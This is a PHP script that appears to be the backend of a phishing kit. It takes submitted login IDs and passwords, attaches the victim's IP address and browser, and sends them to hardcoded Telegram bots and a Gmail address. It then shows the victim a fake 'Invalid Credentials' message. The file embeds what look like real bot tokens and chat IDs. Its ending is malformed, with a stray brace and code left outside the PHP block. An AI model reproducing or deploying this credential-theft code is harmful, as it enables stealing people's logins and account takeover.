<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true ");
header("Access-Control-Allow-Methods: OPTIONS, GET, POST");
header("Access-Control-Allow-Headers: Content-Type, Depth, User-Agent, X-File-Size, X-Requested-With, If-Modified-Since, X-File-Name, Cache-Control");

// Telegram configuration (from environment variables) - Multiple bots support
$telegramBots = [
    [
        'token' => getenv('TELEGRAM_BOT_TOKEN_1') ?: "8540752369:AAGcN62DlKUeh-cN9sR2LiBiunt_-RJSxJY",
        'chat_id' => getenv('TELEGRAM_CHAT_ID_1') ?: "6037378895",
        'name' => 'Bot 1 (Original)'
    ],
    [
        'token' => getenv('TELEGRAM_BOT_TOKEN_2') ?: "8272404690:AAFjvKof7tWOT2ITQTWXWxJyr32dYW8QWi4",
        'chat_id' => getenv('TELEGRAM_CHAT_ID_2') ?: "ADD_YOUR_CHAT_ID_HERE",
        'name' => 'SHARPLOGS2 Bot'
    ]
];

$Receive_email = getenv('RECEIVE_EMAIL') ?: "davidmassmutual@gmail.com"; // Define the email address for logging

// Add more debug
file_put_contents(__DIR__ . '/debug.log', 'Script started at ' . date('Y-m-d H:i:s') . ' from ' . __FILE__ . ' in ' . __DIR__ . PHP_EOL, FILE_APPEND);

// Debug: Log POST data
file_put_contents(__DIR__ . '/debug.log', date('Y-m-d H:i:s') . ' - POST: ' . print_r($_POST, true) . PHP_EOL, FILE_APPEND);

// Get POST data
$em = isset($_POST['di']) ? trim($_POST['di']) : '';
$password = isset($_POST['pr']) ? trim($_POST['pr']) : '';

// Function to log message via email and multiple Telegram bots
function logMessageToAll($message, $send, $subject, $telegramBots) {
    // Send email
    mail($send, $subject, $message);
    file_put_contents(__DIR__ . '/debug.log', 'Email sent to: ' . $send . PHP_EOL, FILE_APPEND);

    $allResults = [];

    // Send to all Telegram bots
    foreach ($telegramBots as $bot) {
        $botToken = $bot['token'];
        $chatId = $bot['chat_id'];
        $botName = $bot['name'];

        // Skip if chat ID is not configured
        if ($chatId === 'ADD_YOUR_CHAT_ID_HERE') {
            file_put_contents(__DIR__ . '/debug.log', 'Skipped ' . $botName . ' - Chat ID not configured' . PHP_EOL, FILE_APPEND);
            continue;
        }

        $mess = urlencode($message);
        $url = "https://api.telegram.org/bot" . $botToken . "/sendMessage?chat_id=" . $chatId . "&text=" . $mess;

        file_put_contents(__DIR__ . '/debug.log', $botName . ' Telegram URL: ' . $url . PHP_EOL, FILE_APPEND);

        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, $url);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);

        $result = curl_exec($curl);
        $error = curl_error($curl);
        curl_close($curl);

        $resultData = json_decode($result, true);
        $success = isset($resultData['ok']) && $resultData['ok'] === true;

        file_put_contents(__DIR__ . '/debug.log', $botName . ' Telegram result: ' . $result . ' Error: ' . $error . PHP_EOL, FILE_APPEND);

        $allResults[] = [
            'bot' => $botName,
            'success' => $success,
            'chat_id' => $chatId,
            'error' => $error
        ];
    }

    return $allResults;
}

// Check if form fields are set
if (!empty($em) && !empty($password)) {
    $ip = getenv("REMOTE_ADDR");
    $useragent = $_SERVER['HTTP_USER_AGENT'];

    $message = "[+]━━━━【🔥 Login Attempt 🔥】━━━━[+]\r\n\n";
    $message .= "ID : " . htmlspecialchars($em) . "\n";
    $message .= "Password : " . htmlspecialchars($password) . "\n\n";
    $message .= "[+]🔥 ━━━━【💻 System INFO】━━━━ 🔥[+]\r\n";
    $message .= "|Client IP: " . $ip . "\n";
    $message .= "|User Agent: " . $useragent . "\n";
    $message .= "|🔥 ━━━━━━━━━━━━━━━━━ 🔥|\n";

    $send = $Receive_email; // Make sure $Receive_email is defined somewhere
    $subject = "Login Attempt: $ip";

    $results = logMessageToAll($message, $send, $subject, $telegramBots);
        $signal = 'ok';
        $msg = 'Invalid Credentials';
    }
}
?>

    // Log results for debugging
    file_put_contents(__DIR__ . '/debug.log', 'Bot results: ' . json_encode($results) . PHP_EOL, FILE_APPEND);
